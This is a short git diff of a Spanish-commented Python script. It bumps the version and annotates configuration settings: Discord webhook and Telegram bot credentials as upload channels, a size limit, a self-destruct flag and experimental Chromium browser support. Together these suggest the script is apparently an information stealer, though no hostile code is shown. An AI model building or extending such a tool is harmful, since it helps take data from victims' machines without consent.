@@ -85,7 +85,10 @@ def Requests_NOT(fallo, temp_dir, script_path):
 # ============================================================
 # Define las variables de configuración globales.
 # ============================================================
-VERSION = "v5.0.5"
+
+# --- Versiones de CH ---
+VERSION = "v5.0.6" # Version actual
+# VERSION = "v5.0.5" # Version anterior
 
 # --- Discord ---
 DISCORD_WEBHOOK_URL = os.getenv("API_Discord")
@@ -95,9 +98,9 @@ TELEGRAM_BOT_TOKEN = os.getenv("TOKEN_TL")
 TELEGRAM_CHAT_ID = os.getenv("CHAT_ID")
 
 # --- Comportamiento ---
-MAX_SIZE_MB = 8
-AUTODESTRUIR = False
-SOPORTE_CHROME = False
+MAX_SIZE_MB = 8 # Tamaño por defecto en megabyte
+AUTODESTRUIR = False # False por defecto, True para autodestruirse
+SOPORTE_CHROME = False # Experimental para navegadores Chromiun
 TRANSPORT_ACTIVO = os.getenv("TRANSPORT", "discord").lower()  # "discord" o "telegram"
 
 # Validación mínima: al menos el transporte elegido debe tener credenciales.
